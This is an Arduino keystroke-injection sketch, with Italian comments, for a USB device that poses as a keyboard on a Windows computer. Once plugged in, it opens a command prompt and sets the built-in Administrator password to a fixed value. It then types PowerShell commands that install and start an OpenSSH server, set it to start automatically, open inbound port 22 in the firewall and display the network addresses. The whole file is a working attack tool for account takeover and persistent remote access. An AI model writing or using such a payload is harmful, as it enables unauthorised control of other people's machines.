#include <Keyboard.h>

void setup() {
    delay(3000);
    Keyboard.begin();

    // Step 1: Apri la finestra "Esegui"
    Keyboard.press(KEY_LEFT_GUI); // Tasto Windows
    Keyboard.press('r');
    delay(200);
    Keyboard.releaseAll();
    delay(600);

    // Step 2: Scrivi "cmd" e premi invio
    Keyboard.print("cmd");
    delay(400);
    Keyboard.press(KEY_RETURN);
    Keyboard.release(KEY_RETURN);
    delay(2000); // Attendi che il CMD si apra

    // Step 3: Scrivi il messaggio
    Keyboard.println("net user Administrator *");
    delay(200);
    Keyboard.println("Nuova.pw");
    delay(200);
    Keyboard.println("Nuova.pw");

    // Step 4: Comandi PowerShell per installare e avviare SSH
    Keyboard.print("powershell -Command \"");
    Keyboard.print("Add-WindowsCapability -Online -Name OpenSSH.Server~~~~0.0.1.0; ");
    Keyboard.print("Start-Service sshd; ");
    Keyboard.print("Set-Service -Name sshd -StartupType 'Automatic'; ");
    Keyboard.print("New-NetFirewallRule -Name sshd -DisplayName 'OpenSSH Server (sshd)' -Enabled True -Direction Inbound -Protocol TCP -Action Allow -LocalPort 22; ");
    Keyboard.print("ipconfig;\"");
    Keyboard.press(KEY_RETURN);
    Keyboard.release(KEY_RETURN);

  // Fine
  Keyboard.end();
}

void loop() {
  // Nulla da fare nel loop
}